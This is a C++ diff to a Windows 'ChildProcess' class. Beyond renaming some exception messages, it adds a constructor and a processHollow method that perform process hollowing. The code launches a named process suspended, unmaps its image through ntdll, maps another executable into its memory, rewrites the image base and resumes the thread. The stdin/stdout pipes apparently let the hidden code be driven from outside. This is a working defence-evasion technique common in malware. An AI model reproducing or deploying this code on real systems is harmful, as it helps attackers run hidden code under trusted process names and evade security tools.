@@ -321,22 +321,22 @@ void ChildProcess::setupPipes()
 	saAttr.lpSecurityDescriptor = NULL;
 
 	if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
-		throw std::exception("blabla");
+		throw std::exception("couldnt create stdout pipe");
 
 	// Ensure the read handle to the pipe for STDOUT is not inherited.
 
 	if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
-		throw std::exception("blabla");
+		throw std::exception("couldnt set stdout handle information");
 
 	// Create a pipe for the child process's STDIN. 
 
 	if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
-		throw std::exception("blabla");
+		throw std::exception("couldnt create stdin pipe");
 
 	// Ensure the write handle to the pipe for STDIN is not inherited. 
 
 	if (!SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
-		throw std::exception("blabla");
+		throw std::exception("couldnt set stdin handle information");
 }
 
 void ChildProcess::setupMetaData(const PROCESS_INFORMATION& info)
@@ -433,4 +433,77 @@ std::string ChildProcess::readSTD(size_t size)
 	ret.resize(read);
 
 	return ret;
+}
+
+
+
+ChildProcess::ChildProcess(const std::string& cmd, const std::string& process_to_hollow) { 
+	STARTUPINFOA info = { sizeof(info) };
+	PROCESS_INFORMATION pi;
+
+	LPSTR hollowedFile = const_cast<char*>(process_to_hollow.c_str());
+
+	setupPipes();
+
+	info.cb = sizeof(STARTUPINFO);
+	info.hStdError = hChildStd_OUT_Wr;
+	info.hStdOutput = hChildStd_OUT_Wr;
+	info.hStdInput = hChildStd_IN_Rd;
+	info.dwFlags |= STARTF_USESTDHANDLES;
+
+	if (!CreateProcessA(NULL, hollowedFile, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &info, &pi)) {
+		throw std::exception("Failed create process");
+	}
+
+	if (this->processHollow(cmd, pi)) {
+		throw std::exception("couldnt hollow process");
+	}
+
+}
+
+UINT ChildProcess::processHollow(const std::string& target_file, PROCESS_INFORMATION pi) {
+	CONTEXT ctx;
+	DWORD64 pebAddr = 0;
+	LPSTR targetFile = const_cast<char*>(target_file.c_str());
+	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+	PE_IMAGE pe_image{ NULL , NULL };
+
+	PBYTE buffer = ProcessHollowingUtils::readFile(targetFile);
+	if (!buffer) {
+		ProcessHollowingUtils::Error("Failed read file");
+	}
+	
+	auto safeHandle = std::make_unique<SafeHandle>(pi.hProcess, pi.hThread);
+
+	ctx.ContextFlags = CONTEXT_INTEGER;
+	if (!ProcessHollowingUtils::getContext(safeHandle.get()->getThread(), ctx)) {
+		ProcessHollowingUtils::Error("Failed get context");
+	}
+
+	pebAddr = ctx.Rdx;
+	std::optional<LPVOID> optionalImageBaseAddr = ProcessHollowingUtils::readProcessMemory(safeHandle.get()->getProcess(), pebAddr);
+	if (!optionalImageBaseAddr) {
+		return EXIT_FAILURE;
+	}
+
+	LPVOID imageBaseAddr = optionalImageBaseAddr.value();
+	if (ProcessHollowingUtils::unmapProcess(ntdll, safeHandle.get()->getProcess(), imageBaseAddr) == EXIT_FAILURE) {
+		return EXIT_FAILURE;
+	}
+
+	ProcessHollowingUtils::mapFile(safeHandle, buffer, imageBaseAddr, pe_image);
+	if (!pe_image.address) {
+		ProcessHollowingUtils::Error("Failed map file to memory");
+	}
+
+	if (!ProcessHollowingUtils::WriteImageBase(safeHandle, ctx, pe_image)) {
+		ProcessHollowingUtils::Error("Failed write new image base");
+	}
+
+	if (!ProcessHollowingUtils::setContextAndResumeThread(safeHandle, ctx)) {
+		ProcessHollowingUtils::Error("Failed set context or resume thread");
+	}
+
+	delete buffer;
+	return EXIT_SUCCESS;
 }
